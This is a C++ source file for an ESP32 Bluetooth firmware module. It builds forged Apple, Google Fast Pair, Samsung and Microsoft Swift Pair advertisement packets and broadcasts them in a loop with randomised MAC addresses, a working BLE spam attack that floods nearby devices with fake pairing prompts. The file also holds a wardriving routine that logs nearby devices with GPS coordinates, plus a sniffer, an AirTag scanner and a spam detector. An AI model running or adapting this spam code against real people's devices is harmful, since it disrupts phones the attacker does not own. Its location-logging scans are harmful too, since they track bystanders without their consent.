#include "ble_module.h"
#include <Arduino.h>
#include "core/system_manager.h"
#include "components/gps_module/gps_module.h"

const char* BLEModule::generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1;
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); 
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; 
  }
  randomName[len] = '\0';
  return randomName;
}

void BLEModule::generateRandomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 255);
  }
  mac[0] = (mac[0] & 0xFC) | 0x02;
}

void BLEModule::esp_fill_random(uint8_t *target, size_t size)
{
  for (size_t i = 0; i < size; ++i) {
    target[i] = rand() % 256; // Generate a random byte
  }
}

#ifdef HAS_BT
BLEData BLEModule::GetUniversalAdvertisementData(EBLEPayloadType Type) {
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
    NimBLEAdvertisementData scannerData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
      case Microsoft: {
        
        const char* Name = this->generateRandomName();

        uint8_t name_len = strlen(Name);

        AdvData_Raw = new uint8_t[7 + name_len];

        AdvData_Raw[i++] = 7 + name_len - 1;
        AdvData_Raw[i++] = 0xFF;
        AdvData_Raw[i++] = 0x06;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x00;
        AdvData_Raw[i++] = 0x80;
        memcpy(&AdvData_Raw[i], Name, name_len);
        i += name_len;

        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
        break;
      }
      case Apple: {
        AdvData_Raw = new uint8_t[17];

        AdvData_Raw[i++] = 17 - 1;    // Packet Length
        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
        AdvData_Raw[i++] = 0x00;        // ...
        AdvData_Raw[i++] = 0x0F;  // Type
        AdvData_Raw[i++] = 0x05;                        // Length
        AdvData_Raw[i++] = 0xC1;                        // Action Flags
        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
        i += 3;   
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] = 0x00;  // ???
        AdvData_Raw[i++] =  0x10;  // Type ???
        esp_fill_random(&AdvData_Raw[i], 3);

        AdvData.addData(std::string((char *)AdvData_Raw, 17));
        break;
      }
      case Samsung: {
        int randval = random(1, 2);

        if (randval == 1)
        {
          AdvData_Raw = new uint8_t[15];

          uint8_t model = watch_models[rand() % 25].value;
          
          AdvData_Raw[i++] = 14; // Size
          AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
          AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
          AdvData_Raw[i++] = 0x00; // ...
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x02;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0x01;
          AdvData_Raw[i++] = 0xFF;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x00;
          AdvData_Raw[i++] = 0x43;
          AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)

          AdvData.addData(std::string((char *)AdvData_Raw, 15));
        }
        else 
        {
          uint8_t advertisementPacket[] = {
            0x02, 0x01, 0x18, 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14,
            0x15, 0x03, 0x21, 0x01, 0x09, 0xEF, 0x0C, 0x01, 0x47, 0x06, 0x3C, 0x94, 0x8E,
            0x00, 0x00, 0x00, 0x00, 0xC7, 0x00
          };
          uint8_t scanResponsePacket[] = {
            0x10, 0xFF, 0x75, 0x00, 0x00, 0x63, 0x50, 0x8D, 0xB1, 0x17, 0x40, 0x46,
            0x64, 0x64, 0x00, 0x01, 0x04
          };

          fill_samsungbud_byte(advertisementPacket);

          AdvData.addData(std::string((char *)advertisementPacket, 31));
          scannerData.addData(std::string((char *)scanResponsePacket, 17));
        }

        

        break;
      }
      case Google: {
        AdvData_Raw = new uint8_t[14];
        AdvData_Raw[i++] = 3;
        AdvData_Raw[i++] = 0x03;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;

        AdvData_Raw[i++] = 6;
        AdvData_Raw[i++] = 0x16;
        AdvData_Raw[i++] = 0x2C; // Fast Pair ID
        AdvData_Raw[i++] = 0xFE;
        AdvData_Raw[i++] = 0x00; // Smart Controller Model ID
        AdvData_Raw[i++] = 0xB7;
        AdvData_Raw[i++] = 0x27;

        AdvData_Raw[i++] = 2;
        AdvData_Raw[i++] = 0x0A;
        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

        AdvData.addData(std::string((char *)AdvData_Raw, 14));
        break;
      }
      default: {
        LOG_MESSAGE_TO_SD(F("Please Provide a Company Type"));
        Serial.println(F("Please Provide a Company Type"));
        break;
      }
    }

    delete[] AdvData_Raw;

    return {AdvData, scannerData};
}
#endif

void BLEModule::executeSpamAll()
{
#ifdef HAS_BT
    BLEInitilized = true;
    while (BLEInitilized)
    {
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(0, 0, 255), 300, false);
#endif
      if (Serial.available() > 0)
      {
        String message = Serial.readString();

        if (message.startsWith("stop"))
        {
          shutdownBLE();
          break;
        }
      }
      executeSpam(EBLEPayloadType::Apple, false);
      executeSpam(EBLEPayloadType::Google, false);
      executeSpam(EBLEPayloadType::Microsoft, false);
      executeSpam(EBLEPayloadType::Samsung, false);
    }
#endif
}

void BLEModule::executeSpam(EBLEPayloadType type, bool Loop) {
#ifdef HAS_BT
    while (Loop)
    {
      if (Serial.available() > 0)
      {
        String message = Serial.readString();

        if (message.startsWith("stop"))
        {
          break;
        }
      }
      NimBLEDevice::init("");

      NimBLEServer *pServer = NimBLEDevice::createServer();

      pAdvertising = pServer->getAdvertising();

      BLEData advertisementData = this->GetUniversalAdvertisementData(type);
      pAdvertising->setAdvertisementData(advertisementData.AdvData);
      pAdvertising->setScanResponseData(advertisementData.ScanData);
      pAdvertising->start();
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(0, 0, 255), 300, false);
#endif
      delay(100);
      pAdvertising->stop();

      NimBLEDevice::deinit();

      uint8_t macAddr[6];
      generateRandomMac(macAddr);

      esp_base_mac_addr_set(macAddr);
#ifdef WROOM
      delay(1000); // Increase the delay due to weak CPU
#else
      delay(100);
#endif
    }
#endif
}

void BLEModule::BleSpamDetector()
{
#ifdef HAS_BT
  shutdownBLE();
  NimBLEDevice::init("");
  NimBLEDevice::getScan()->setAdvertisedDeviceCallbacks(new BleSpamDetectorCallbacks());
  NimBLEDevice::getScan()->start(0, nullptr, false);

  while (BLEInitilized)
  {
    if (Serial.available() > 0)
    {
      String message = Serial.readString();

      if (message.startsWith("stop"))
      {
        NimBLEDevice::getScan()->stop();
        break;
      }
    }
  }
#endif
}

void BLEModule::InitWarDriveCallback()
{
#ifdef HAS_BT
  shutdownBLE();
  NimBLEDevice::init("");
  NimBLEDevice::getScan()->setAdvertisedDeviceCallbacks(new WarDriveBTCallbacks());
  NimBLEDevice::getScan()->start(0, nullptr, false);
#endif
}

void BLEModule::BleSniff()
{
#ifdef HAS_BT
  shutdownBLE();
  NimBLEDevice::init("");
  NimBLEDevice::getScan()->setAdvertisedDeviceCallbacks(new BleSnifferCallbacks());
  NimBLEDevice::getScan()->start(0, nullptr, false);

  #ifdef SD_CARD_CS_PIN
  SystemManager::getInstance().sdCardModule.startPcapLogging("BT.pcap", true);
  #endif

  while (BLEInitilized)
  {
    if (Serial.available() > 0)
    {
      String message = Serial.readString();

      if (message.startsWith("stop"))
      {
        NimBLEDevice::getScan()->stop();
#ifdef SD_CARD_CS_PIN
SystemManager::getInstance().sdCardModule.stopPcapLogging();
#endif
        break;
      }
    }
  }
#endif
}

void BLEModule::AirTagScanner()
{
#ifdef HAS_BT
  shutdownBLE();
  NimBLEDevice::init("");
  NimBLEDevice::getScan()->setAdvertisedDeviceCallbacks(new BleAirTagCallbacks());
  NimBLEDevice::getScan()->start(0, nullptr, false);

  while (BLEInitilized)
  {
    if (Serial.available() > 0)
    {
      String message = Serial.readString();

      if (message.startsWith("stop"))
      {
        NimBLEDevice::getScan()->stop();
        break;
      }
    }
  }
#endif
}

void BLEModule::findtheflippers()
{
#ifdef HAS_BT
  shutdownBLE();
  NimBLEDevice::init("");
  NimBLEDevice::getScan()->setAdvertisedDeviceCallbacks(new FlipperFinderCallbacks());
  NimBLEDevice::getScan()->start(0, nullptr, false);

  while (BLEInitilized)
  {
    if (Serial.available() > 0)
    {
      String message = Serial.readString();

      if (message.startsWith("stop"))
      {
        NimBLEDevice::getScan()->stop();
        break;
      }
    }
  }
#endif
}

#ifdef HAS_BT

void FlipperFinderCallbacks::onResult(NimBLEAdvertisedDevice* advertisedDevice)
{
  String advertisementName = advertisedDevice->getName().c_str();
  int advertisementRssi = advertisedDevice->getRSSI();
  String advertisementMac = advertisedDevice->getAddress().toString().c_str();
  
  if (advertisedDevice->haveServiceUUID())
  {
    String UUID = advertisedDevice->getServiceUUID().toString().c_str();
    if (UUID.isEmpty())
    {
      UUID = advertisedDevice->getServiceDataUUID().toString().c_str();
    }

    if (UUID.indexOf("0x3082") != -1)
    {
      Serial.printf("Found White Flipper Device %s", advertisedDevice->toString().c_str());
      LOG_MESSAGE_TO_SD(F("Found White Flipper Device"));
      LOG_MESSAGE_TO_SD(advertisedDevice->toString().c_str());
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 140, 0), 500, false);
#endif
      return;
    }

    if (UUID.indexOf("0x3081") != -1)
    {
      Serial.printf("Found Black Flipper Device %s", advertisedDevice->toString().c_str());
      LOG_MESSAGE_TO_SD(F("Found Black Flipper Device"));
      LOG_MESSAGE_TO_SD(advertisedDevice->toString().c_str());
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 140, 0), 500, false);
#endif
      return;
    }

    if (UUID.indexOf("0x3083") != -1)
    {
      Serial.printf("Found Transparent Flipper Device %s", advertisedDevice->toString().c_str());
      LOG_MESSAGE_TO_SD(F("Found Transparent Flipper Device"));
      LOG_MESSAGE_TO_SD(advertisedDevice->toString().c_str());
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 140, 0), 500, false);
#endif
      return;
    }
  }
}

void WarDriveBTCallbacks::onResult(NimBLEAdvertisedDevice* advertisedDevice)
{
  #ifdef HAS_BT
  #ifdef HAS_GPS
  if (SystemManager::getInstance().gpsModule->gps.location.isValid() && SystemManager::getInstance().gpsModule->gps.location.isUpdated())
  {
    String Message = G_Utils::formatString("BLE Device Info: %s, Lat: %f, Lng: %f", advertisedDevice->toString().c_str(), SystemManager::getInstance().gpsModule->gps.location.lat(), SystemManager::getInstance().gpsModule->gps.location.lng());
    LOG_RESULTS("bt_wardrive.txt", "gps", Message);
  }
  #endif
  #endif
}

void BleSpamDetectorCallbacks::onResult(NimBLEAdvertisedDevice* advertisedDevice)
{
  String payload = String(advertisedDevice->getManufacturerData().c_str());
  String MacAddr = String(advertisedDevice->getAddress().toString().c_str());

  if (advertisedDevice->haveServiceUUID())
  {
    String UUID = advertisedDevice->getServiceUUID().toString().c_str();
    if (UUID.isEmpty())
    {
      UUID = advertisedDevice->getServiceDataUUID().toString().c_str();
    }

    if (UUID.indexOf("0x3082") != -1 || UUID.indexOf("0x3083") != -1 || UUID.indexOf("0x3081") != -1)
    {
      return; // Ignore Spammy Flipper Zeros
    }
  }

  if (payloadInfoMap.find(payload) == payloadInfoMap.end()) {
      PayloadInfo info = {1, millis(), MacAddr};
      payloadInfoMap[payload] = info;
      Serial.println(F("New payload detected."));
      LOG_MESSAGE_TO_SD(F("New payload detected."));
  } else {
      PayloadInfo &info = payloadInfoMap[payload];
      info.count++;
      unsigned long currentTime = millis();
      unsigned long detectionWindow = 2000;
      if (info.count > 20 && (currentTime - info.firstSeenTime) <= detectionWindow || info.Mac == MacAddr) {
          Serial.println(F("BLE Spam detected!"));
          LOG_MESSAGE_TO_SD(F("BLE Spam detected!"));
#ifdef NEOPIXEL_PIN
SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 0, 0), 200, false);
#endif
      } else if ((currentTime - info.firstSeenTime) > detectionWindow) {
          info.count = 1;
          info.firstSeenTime = currentTime;
          info.Mac = "";
      }
  }
}

void BleSnifferCallbacks::onResult(NimBLEAdvertisedDevice* advertisedDevice)
{
  uint8_t* Payload = advertisedDevice->getPayload();
  size_t PayloadLen = advertisedDevice->getPayloadLength();

  Serial.println(F("Packet Recieved"));

#ifdef SD_CARD_CS_PIN
  SystemManager::getInstance().sdCardModule.logPacket(Payload, PayloadLen);
#endif
}

// Credit to https://github.com/MatthewKuKanich for the AirTag Research
void BleAirTagCallbacks::onResult(NimBLEAdvertisedDevice* advertisedDevice)
{
  uint8_t* payLoad = advertisedDevice->getPayload();
  size_t payLoadLength = advertisedDevice->getPayloadLength();

  // searches both "1E FF 4C 00" and "4C 00 12 19" as the payload can differ slightly
  bool patternFound = false;
  for (int i = 0; i <= payLoadLength - 4; i++) {
    if (payLoad[i] == 0x1E && payLoad[i+1] == 0xFF && payLoad[i+2] == 0x4C && payLoad[i+3] == 0x00) {
      patternFound = true;
      break;
    }
    if (payLoad[i] == 0x4C && payLoad[i+1] == 0x00 && payLoad[i+2] == 0x12 && payLoad[i+3] == 0x19) {
      patternFound = true;
      break;
    }
  }

  if (patternFound) {
    String macAddress = advertisedDevice->getAddress().toString().c_str();
    macAddress.toUpperCase();

    if (foundDevices.find(macAddress) == foundDevices.end()) {
      foundDevices.insert(macAddress);
      airTagCount++;

      int rssi = advertisedDevice->getRSSI();

      Serial.println("AirTag found!");
      Serial.print("Tag: ");
      Serial.println(airTagCount);
      Serial.print("MAC Address: ");
      Serial.println(macAddress);
      Serial.print("RSSI: ");
      Serial.print(rssi);
      Serial.println(" dBm");
      Serial.print("Payload Data: ");
      LOG_MESSAGE_TO_SD("AirTag Found! Tag: " + String(airTagCount) + " Mac Address: " + macAddress + "RSSI: " + String(rssi) + "dbm;");
      for (size_t i = 0; i < payLoadLength; i++) {
        Serial.printf("%02X ", payLoad[i]);
      }

      Serial.println("\n");
    }
  }
}

#endif